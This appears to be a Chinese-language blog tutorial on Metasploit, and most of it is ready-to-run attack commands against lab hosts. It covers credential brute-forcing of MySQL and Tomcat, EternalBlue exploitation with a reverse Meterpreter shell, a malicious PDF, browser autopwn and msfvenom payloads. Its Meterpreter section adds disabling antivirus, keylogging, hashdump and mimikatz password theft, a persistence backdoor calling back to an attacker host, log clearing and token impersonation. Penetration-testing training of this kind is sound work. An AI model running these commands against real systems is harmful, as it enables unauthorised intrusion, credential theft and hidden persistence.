---
title: Metasploit基础教程
date: 2024-01-13 20:28:53
tags: 渗透测试
mathjax: true
---

# Metasploit基础教程

## 概述

### 初始化

启动PostgreSQL：

```bash
service postgresql start
```

创建和初始化数据库：

```bash
msfdb init
```

### 工作区创建

```
workspace #查看所有工作区
workspace -a test #添加名为test的工作区
workspace default #转到default工作区
```

### 导入扫描报告

```
db_import /root/openvas.xml
workspace -v #查看导入的主机
```

## 模块查询

### 预分析

```
host #查看扫描出的主机
vulns #查看扫描出的漏洞
```

### 手动查找

```
search [options] <keywords>
    [options]:
        -h 显示帮助
        -o <file> 指定输出信息保存文件 格式csv
        -S <string> 搜索指定字符串
        -u 指定搜索模块
```

部分keywords：

| 关键字         | 描述                                                      |
| ----------- | ------------------------------------------------------- |
| aka         | 别名                                                      |
| author      | 作者                                                      |
| arch        | 架构                                                      |
| bid         | Bugtraq ID                                              |
| cve         | CVE ID                                                  |
| edb         | Exploit-DB ID                                           |
| check       | 支持check方法                                               |
| date        | 发布日期                                                    |
| description | 描述信息                                                    |
| full_name   | 全名搜索                                                    |
| mod_time    | 修改日期                                                    |
| name        | 描述名称                                                    |
| path        | 路径                                                      |
| platform    | 运行平台                                                    |
| port        | 端口                                                      |
| rank        | 漏洞严重级别 如good 或使用操作运算符gte400                             |
| ref         | 模块编号                                                    |
| reference   | 参考信息                                                    |
| target      | 目标                                                      |
| type        | 特定类型 exploit payload auxiliary encoder evasion post或nop |

举例：

```
search cv3:2019
search name:MS17-010 SMB REC Detection
```

### 手动导入

例如从Exploit-DB上下载webtest.rb后：

```bash
mkdir /root/.msf4/modules/exploits
cd /root/.msf4/modules/exploits
mkdir test
cd test/ #并放入webtest.rb
```

启动MSF后使用：

```
use exploit/test/webtest
set RHOST 192.168.29.141
```

## 攻击

加载与配置：

```
use exploit/test/webtest
show payloads
set payload php/exec
show options
set CMD dir
```

设置架构：

```
use exploit/windows/smb/ms08_067_netapi
show options
show targets
set target 2
```

设置编码：

```bash
msfvenom [options] <var=val>
    #-p 指定使用的Payload
    #-e 指定编码格式
    #-a 指定系统架构
    #-s 指定Payload最大值
    #-i 指定编码次数
    #-f 指定生成的文件格式

msfvenom -l encoders #查看支持的所有编码
msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.29.137 --platform windows -a x86/shikata_ga_nai -f exe > msf.exe
```

## 攻击范例

### MySQL数据库服务

```
use auxiliary/scanner/mysql/mysql_login
show options
set RHOST 192.168.29.137
set USER_FILE /root/users.txt
uset USERPASS_FILE /root/passwords.txt
exploit
```

### PostgreSQL数据库服务

```
use auxiliary/scanner/postgres/postgres_login
show options
set RHOSTS 192.168.29.137
exploit
```

### PDF文件攻击

```
use exploit/windows/fileformat/adobe_pdf_embedded_exe
show options
set FILENAME test.pdf
set INFILENAME /root/evil.pdf
exploit
```

### MS17_010

```
search ms17-010
use auxiliary/scanner/smb/smb_ms17_010 #漏洞扫描模块
set RHOST 192.168.29.143
exploit #发现存在漏洞
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
show options
set RHOST 192.168.29.143
set LHOST 192.168.29.134
exploit #进入meterpreter会话
shell #进入目标主机cmd
background #将meterpreter会话置于后台 回到MSF会话
sessions #查看所有会话
sessions -i 1 #回到1号会话
```

### Shodan搜索

搜索匹配iomega关键字的所有信息。

```
use auxiliary/gather/shodan_search
set SHODAN_APIKEY API密钥
set QUERY iomega
run
```

想更多结果或使用过滤关键字，得交钱。

### Tomcat服务

```
search tomcat
use auxiliary/scanner/http/tomcat_mgr_login
show options
# set PASS_FILE 设置密码文件 默认自带tomcat_mgr_default_pass.txt
# set USER_FILE 设置用户名文件 默认自带tomcat_mgr_default_users.txt
set RHOSTS 192.168.41.142
set RPORT 8180
exploit
```

### Telnet

```
use auxiliary/scanner/telnet/telnet_version
show options
set RHOST 192.168.6.105
exploit
```

### Samba服务

```
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.6.105
exploit
```

扫描网络内开启Samba服务器的所有主机：

```
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.6.0/24
set THREADS 255
exploit
```

### 攻击浏览器

用户访问一个Web页面时自动入侵，只支持IE7

```
search autopwn
use auxiliary/server/browser_autopwn
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 192.168.41.234
set URIPATH "filetypes"
exploit
```

在客户端IE中访问http://IP地址:8080/filetypes时产生活跃的对话。

## Meterpreter

### 基础命令

```
run killav #关闭杀毒软件
sysinfo #获取主机信息
run scraper #获取主机详细信息 并以.reg文件形式下载
run post/windows/gather/checkvm #查看是否运行虚拟机
pwd #查看当前工作目录
ls #查看当前目录文件
rm desktop.ini #删除文件
cd .. #切换工作目录
mkdir test #创建test目录
download Pictures
upload /root/passwords.txt

keyscan_start #开始监听键盘
keyscan_dump #导出监听结果
keyscan_stop

screenshot

run post/windows/gather/enum_logged_on_users #枚举用户

getuid #查看权限
getsystem #尝试提权

hashdump #获取密码hash
load mimikatz
mimikatz_command -f sekurlsa::wdigest -a "full" #法一获取密码
msv #获取哈希密码
wdigest #法二获取密码 内存中获取

#绑定进程
ps #获取运行中的进程
getpid #获取当前进程pid
migrate #绑定到pid为400的进程上

#运行程序
execute [options] -f command
    #-H 创建隐藏进程
    #-a 要传递的参数
    #-i 跟进程交互
    #-m 内存中执行
    #-t 使用当前伪造的线程令牌运行
    #-s 在给定的会话中执行
execute -s 1 -f cmd

run post/windows/manage/enable_rdp #远程桌面
idletime #查看远程用户空闲时常
rdesktop 192.168.29.143

run packetrecorder -li #列举目标主机网卡
run packetrecorder -i 1 -l /root/Desktop #捕获网卡编号为1的数据 保存到桌面
```

### 持久后门

创建后门：

```
run persistence -X -i 5 -p 8888 192.168.29.134 #-X随系统启动 -i间隔5秒重连
```

本地建立监听：

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 192.168.29.134
set LPORT 8888
exploit
```

清除痕迹：

```
clearev
```

搭建跳板：

```
run get_local_subnets #查看目标系统上的子网
background #session id为1 回到MSF会话
route add 192.168.1.0 255.255.255.0 1 #向session id为1的会话添加C段为1的路由
route print #查看已有路由

#也可在MSF会话中自动添加路由：
load auto_add_route
exploit
```

### 假冒令牌

在Meterpreter会话中加载incognito模块：

```
use incognito
list_tokens -u #列举所有可用令牌
impersonate_token AA-886OKJM26FSW\\Test #假冒Test用户
```

## 免杀

### Veil Evasion

略。

## msfcli

略。
